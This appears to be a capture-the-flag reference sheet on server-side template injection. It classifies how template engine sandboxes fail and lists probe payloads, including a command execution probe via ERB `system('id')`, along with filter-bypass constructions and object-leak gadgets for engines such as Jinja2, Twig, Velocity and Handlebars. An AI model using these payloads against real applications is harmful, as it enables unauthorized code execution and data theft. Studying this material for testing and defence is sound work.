# Sandbox taxonomy — how template sandboxes fail

Every "safe" template engine has a security boundary between the
expression and the runtime. The boundary has exactly four
failure-modes — enumerate them before inventing a fifth.

---

## 1. The four failure-modes

```text
M1 — boundary does not exist
     the engine was never meant to gate: ERB, EJS, Groovy, Pug,
     Mako, PHP-in-Twig — expression IS language code
M2 — the gate is a filter, not a boundary
     keyword regex / blacklist / delimiter-strip — bypassable
     by construction (encoding, concat, attr-alternates)
M3 — the gate leaks a privileged object
     a bound helper/context-object holds a method or field that
     walks past the sandbox — {{lipsum.__globals__}}, $class,
     _context, beans, @root.constructor
M4 — the runtime is powerful, the gate is honest, but the DATA
     is enough
     no escape needed: config/env/model fields reachable through
     sanctioned attribute-walk read the flag directly
```

M4 is the underrated one — you don't need RCE, you need the flag;
if `{{config.FLAG}}` resolves, the sandbox held and it didn't matter.

## 2. Boundary-check probes — which mode am I in?

```text
M1 check: {{7*7}} evals AND arbitrary syntax works → probably M1
         test: <%=system('id')%> in ERB — just runs
M2 check: '{{cl'+'ass'}} works but '__class__' blocked → M2
         → enumerate the blocklist with sanitizer_fuzz
M3 check: {{lipsum}}/{{config}}/{{app}}/$class/{{_context}}
         bound → walk their attrs → privileged path
M4 check: {{config.FLAG}}/{{settings}}/{{x.__dict__}} → direct read
```

## 3. The gate-as-filter bypass table

| Blocked token | Construction |
|---|---|
| `__` | `'\x5f\x5f'` in string / `dict(__x__=v)` keys / `{%set%}` build |
| `class` | `'cl'+'ass'` / `request.args.c` / hex-bytes / `dict(cl`+`ass=v)` |
| `.` | `['x']` / `|attr('x')` / `?api` / `.getX()` |
| `()` | `|map('fn')` / `|filter('fn')` / param-carried fn-names |
| quotes | `request.args.x` / `dict(k=v)` keys / `'%c'|format(N)` |
| `{{}}` | `{% %}` statements / `{%print%}` / block-variants |
| `import` | `__import__` via subclasses / `sys.modules['os']` |
| `eval` | `Function('...')` ctor / `exec` via __builtins__ |
| `os` | `sys.modules['os']` / `config.from_pyfile` / catch_warnings |

## 4. The object-leak inventory — the M3 catalog

```text
Python-engines (Jinja2/Mako):
   lipsum cycler joiner namespace        → .__globals__/__init__
   self                                  → ._TemplateReference__context
   config request session g app           → flask binds
   url_for get_flashed_messages get_template_attribute
   range dict lipsum                       → helper fns → globals

PHP-engines (Twig/Smarty/Blade):
   _self _context this app                → env/loader/request
   app.request app.user app.flashes        → symfony binds
   smarty.const smarty.server              → constants+env
   config() env() app()                    → laravel helpers

Java-engines (Velocity/FM/Thymeleaf):
   $class $render $field $esc $context     → velocity-tools gadgets
   beans environment                       → spring binds
   .data_model                             → FM model dump
   pageContext                             → JSP scope

Node-engines (Nunjucks/EJS/Handlebars):
   range cycler joiner                     → .constructor chain
   global process module                   → direct if bound
   @root this                              → handlebars context
   require mainModule                      → module-load path
```

## 5. The privileged-boundary matrix — what's gated where

| Engine | Sandbox boundary | Where it fails |
|---|---|---|
| Jinja2 | none in templates (it's the RENDER fn) | always — it's designed to run python |
| Twig | security-policy (tags/filters/methods) | `_self.env`, map/filter callables, version-misses |
| FreeMarker | TemplateClassResolver | `?api`, `?new` when resolver off, bundled Execute |
| Velocity | SecureUberspector | `$class`/`$render` tools, classLoader, method-enum |
| Thymeleaf | SpEL restrictions | preprocessing `__${}__`, beans, spring-el full |
| ERB | none | `<%= system() %>` — raw ruby |
| EJS | none | `<%= require %>` — raw JS |
| Mako | none | `${}`/`%` — raw python |
| Nunjucks | none — but node-scope | `range.constructor` → Function |
| Smarty | secure-mode | `{if}`-eval, `{math}`, $smarty.* |
| Handlebars | "logic-less" | `{{lookup}}+constructor` → Function |
| Liquid | drop-model attr-gate | context objects themselves leak |
| Django | no-eval-by-design | `{% include %}`, auto-call, `__dict__`, debug |
| Groovy | none | raw groovy |
| SpEL | SimpleEvaluationContext | `T()` statics, beans |
| Slim | none | `#{ruby}` raw |
| Pebble/Jinjava | method-allowlist | `.class`/forName |

## 6. The "sandbox-broken" signal — how to tell escape-vs-read

```text
{{os}}/{{process}}/{{Runtime}} reachable → FULL escape available
{{config}}/{{context}}/{{beans}} only    → read-only — flag-in-context
{{x.__class__}} reachable                → object-model open — M3
{{x.method}} auto-called                  → M4 risk — side-effects
{{fn()}} callable                        → function-call allowed
```

## 7. The defense-in-depth traps — what's REALLY blocked

```text
- jinja2.sandbox.SandboxedEnvironment — the REAL sandbox env —
  attribute-access checks — only safe-attrs resolve —
  BUT: is_safe_attribute default allows most non-_ attrs —
  private _ names are the gate — public helpers still open
- twig sandbox extension — policy object — check which
  tags/filters/methods ARE allowed — the allowlist leaks surface
- freemarker TemplateClassResolver.SAFER — ?new allowed only
  for whitelisted — Execute/ObjectConstructor NOT whitelisted
- velocity SecureUberspector — blocks ClassLoader/class names —
  check whether forName-named-methods still resolve via beans
- handlebars proto-access-control — newer versions block
  __proto__/constructor — check version — protoAccessControl
```

The fix-status is version-dependent — the engine's OWN version-
leak (`{{config}}`, stack-trace, `${.version}`) tells which
bypass-generation applies.
